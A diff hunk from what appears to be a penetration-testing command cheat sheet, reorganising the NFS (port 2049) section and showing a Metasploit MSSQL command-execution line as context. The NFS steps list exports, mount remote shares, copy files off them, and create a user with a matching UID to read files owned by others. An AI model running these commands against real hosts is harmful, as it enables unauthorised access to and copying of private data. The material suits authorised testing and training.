@@ -680,19 +680,28 @@ msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set 
 sessions -i 1
 
 [*] (2049) NFS
-mkdir nfs 2>/dev/null; showmount -e $TARGET
++---------- List Mounts ----------+
+showmount -e $TARGET; mkdir nfs 2>/dev/null
+
++---------- Version Check ----------+
 for v in 2 3 4; do sudo mount -t nfs -o vers=$v,nolock $TARGET:/DIRECTORY ./nfs && echo "vers=$v SUCCESS" && sudo umount ./nfs || echo "vers=$v FAILED"; done
+
++---------- Mount NFS, List Files ----------+
 sudo mount -t nfs -o vers=3,nolock "$TARGET":"/DIRECTORY" "./nfs"
 sudo tree -puga "./nfs/"
-sudo umount --lazy "./nfs"
-rm -rf "./nfs"
 
++---------- Unmount NFS ----------+
+sudo umount --lazy "./nfs"; rm -rf "./nfs"
+
++---------- Copy Files to Current Folder ----------+
 sudo cp -r ./nfs/. .
+
++---------- Open Files as Sudo ----------+
 sudo open file.txt
 sudo open file.png
 
++---------- Add User for Reading Files ----------+
 sudo adduser -u 1002 mntuser
-sudo usermod -u 1003 mntuser
 sudo su mntuser
 setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
